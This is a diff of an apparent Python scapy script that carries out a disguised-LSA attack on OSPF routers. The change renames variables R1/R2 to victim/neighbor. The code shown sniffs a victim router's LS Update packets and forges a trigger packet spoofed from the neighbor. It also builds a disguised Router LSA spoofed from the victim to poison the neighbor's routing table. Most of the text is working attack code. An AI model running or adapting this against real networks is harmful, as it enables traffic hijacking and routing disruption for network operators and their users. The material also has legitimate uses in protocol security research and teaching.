@@ -77,17 +77,17 @@ if __name__ == '__main__':
     
     # store the arguments in variables
     # router 1 (victim) = the router we want to spoof and send the trigger packet too
-    R1 = args.victim
+    victim = args.victim
     # router 2 (neighbor) = the router we want to send the disguised LSA packet to
-    R2 = args.neighbor
+    neighbor = args.neighbor
     # iface = interface that we use to sniff and send the packets
     iface = args.iface
 
     # print confirmation
-    print(">>> Sniffing for LS Update packets from R1 on", iface)
+    print(">>> Sniffing for LS Update packets from victim on", iface)
 
     # Sniffing for packet using scapy sniff module
-    packets = sniff(filter="proto ospf", iface=iface, stop_filter=lambda packet: check_packet_get_pos(R1, packet))
+    packets = sniff(filter="proto ospf", iface=iface, stop_filter=lambda packet: check_packet_get_pos(victim, packet))
 
     # get the last packet sniffed and copy it
     og_packet = packets[-1].copy()
@@ -95,10 +95,10 @@ if __name__ == '__main__':
     og_Router_LSA = og_packet[OSPF_LSUpd].lsalist[lsa_position][OSPF_Router_LSA]
 
     # print confirmation
-    print(">>> Preparing trigger packet to send to R1...")
+    print(">>> Preparing trigger packet to send to victim...")
 
     """
-    prepare a trigger packet that is copied off of the original packet sent by R1
+    prepare a trigger packet that is copied off of the original packet sent by victim
     """
     trigger = og_packet.copy()
     trigger_Router_LSA = trigger[OSPF_LSUpd].lsalist[lsa_position][OSPF_Router_LSA]
@@ -127,17 +127,17 @@ if __name__ == '__main__':
     # scapy will recalculate the length, checksums etc
     trigger[Ether].src = None
     trigger[Ether].dst = None
-    trigger[IP].src = R2
-    trigger[IP].dst = R1
+    trigger[IP].src = neighbor
+    trigger[IP].dst = victim
     trigger[IP].chksum = None
     trigger[IP].len = None
-    trigger[OSPF_Hdr].src = R2
+    trigger[OSPF_Hdr].src = neighbor
     trigger[OSPF_Hdr].chksum = None
     trigger[OSPF_Hdr].len = None
     trigger_Router_LSA.len = None
     trigger_Router_LSA.chksum = None
 
-    print(">>> Preparing disguised packet to send to R2...")
+    print(">>> Preparing disguised packet to send to neighbor...")
 
     # copy the original packet
     spoofed = og_packet.copy()
@@ -193,8 +193,8 @@ if __name__ == '__main__':
 
     # set the packet fields
     # scapy will recalculate the length, checksums etc
-    spoofed[IP].src = R1
-    spoofed[IP].dst = R2
+    spoofed[IP].src = victim
+    spoofed[IP].dst = neighbor
     spoofed[IP].chksum = None
     spoofed[IP].len = None
     spoofed[OSPF_Hdr].chksum = None
@@ -207,4 +207,3 @@ if __name__ == '__main__':
     trigger.show2()
     print("\n>>> Spoofed packet")
     spoofed.show2()
-
